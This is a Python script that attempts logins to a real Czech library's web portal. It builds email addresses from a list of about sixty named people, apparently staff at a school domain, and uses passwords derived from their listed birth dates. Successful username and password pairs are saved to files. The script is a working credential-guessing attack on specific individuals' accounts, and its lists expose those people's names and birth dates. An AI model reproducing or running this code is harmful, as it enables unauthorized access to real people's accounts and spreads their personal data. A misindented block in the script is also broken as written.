import threading
import requests

data = {"username":"", "password":"040226","wd":"", "_csrf":"393b1f80-d7a2-4861-a1c8-79ba721d7e30"}
url = "https://tritius.knihovnatrinec.cz/process-login"

names = [['Sikora', 'Pavel'], ['Branc', 'Kazimir'], ['Bichlerova', 'Zlatka'], ['Chowancova', 'Helena'], ['Mitrengova', 'Dagmar'], ['Brudna', 'Antonia'], ['Wozniakova', 'Alena'], ['Krohnova', 'Ivana'], ['Babilonova', 'Miroslava'], ['Pilchova', 'Sarka'], ['Vratny', 'Ladislav'], ['Kantorova', 'Marcela'], ['Macoskova', 'Alena'], ['Raszkova', 'Libuse'], ['Jursova', 'Anna'], ['Brzuskova', 'Renata'], ['Klepaczova', 'Lenka'], ['Kucirkova', 'Bibiana'], ['Pastorkova', 'Vera'], ['Wiszczorova', 'Anna'], ['Kantor', 'Ivo'], ['Olszarova', 'Gertruda'], ['Zawiszova', 'Barbora'], ['Kawulokova', 'Vlasta'], ['Belanova', 'Milada'], ['Andrikovicova', 'Marta'], ['Koci', 'Tomas'], ['Olsovska', 'Karin'], ['Dohnalova', 'Sarka'], ['Liberdova', 'Vlasta'], ['Mlcoch', 'Rudolf'], ['Vrankova', 'Jarmila'], ['Frankova', 'Hana'], ['Kuczynska', 'Ivana'], ['Gibiec', 'Marcel'], ['Kosutova', 'Renata'], ['Liszkova', 'Marta'], ['Demelova', 'Karla'], ['Plucnar', 'Marian'], ['Dudova', 'Sarka'], ['Brauner', 'Rene'], ['Cieslarova', 'Romana'], ['Brukova', 'Petra'], ['Bajtkova', 'Karin'], ['Hojdyszova', 'llona'], ['Hlozkova', 'Jana'], ['Raskova', 'Lenka'], ['Jestrabova', 'Andrea'], ['Navratik', 'Jiri'], ['Caputova', 'Svetlana'], ['Cerna', 'Andrea'], ['Krckova', 'Ivana'], ['Gajdzicova', 'Jana'], ['Nesetova', 'Janina'], ['Byrtusova', 'Petra'], ['Madari', 'Pavlina'], ['Macurova', 'Katerina'], ['Hanzlova', 'Nikol'], ['Mikeskova', 'Kamila']]

dates = [['17', '01', '1953'], ['16', '02', '1953'], ['02', '10', '1953'], ['20', '03', '1956'], ['11', '08', '1956'], ['12', '09', '1956'], ['12', '11', '1956'], ['12', '12', '1956'], ['27', '03', '1957'], ['30', '03', '1957'], 
         ['29', '04', '1957'], ['20', '05', '1957'], ['09', '02', '1958'], ['27', '04', '1958'], ['02', '01', '1959'], ['28', '02', '1959'], ['02', '04', '1959'], ['05', '04', '1959'], ['22', '07', '1959'], ['25', '07', '1959'],
         ['20', '08', '1959'], ['24', '10', '1959'], ['11', '02', '1960'], ['22', '02', '1960'], ['03', '08', '1961'], ['15', '03', '1962'], ['03', '06', '1962'], ['27', '03', '1963'], ['22', '06', '1963'], ['17', '06', '1964'],
         ['20', '05', '1965'], ['19', '01', '1966'], ['22', '02', '1966'], ['07', '03', '1967'], ['15', '05', '1967'], ['22', '06', '1969'], ['24', '07', '1969'], ['01', '07', '1970'], ['25', '04', '1971'], ['19', '10', '1971'],
         ['24', '12', '1971'], ['14', '03', '1972'], ['11', '10', '1972'], ['06', '10', '1973'], ['16', '03', '1975'], ['10', '09', '1976'], ['09', '05', '1977'], ['17', '05', '1977'], ['12', '07', '1977'], ['08', '03', '1978'],
         ['08', '01', '1979'], ['23', '03', '1979'], ['13', '08', '1979'], ['19', '09', '1980'], ['06', '04', '1981'], ['25', '03', '1982'], ['06', '04', '1982'], ['24', '11', '1983'], ['30', '06', '1986'], ['21', '10', '1988']]


    thread_num = 1
    start = 0
    threads = []




def thread_function(start, end, hop):
    
    for i in range(len(names)):
        
        data["username"] = names[i][1].lower() + "." + names[i][0].lower() + "@gymtri.cz"
        data["password"] = dates[i][2][2:] + dates[i][1] + dates[i][0   ]
        try:
            response = requests.post(url, data=data)
        except:
            pass

        if response.url == "https://tritius.knihovnatrinec.cz/":
            file = open(str(i) + ".txt","w")
            file.write(data["username"] + " " + data["password"] + "\n")
            file.close()
            print(data["username"], "valid")
        else:
            print(data["username"], "invalid")





for i in range(thread_num):
    threads.append(threading.Thread(target=thread_function, args=(start + i,100000,thread_num)))
    threads[i].start()
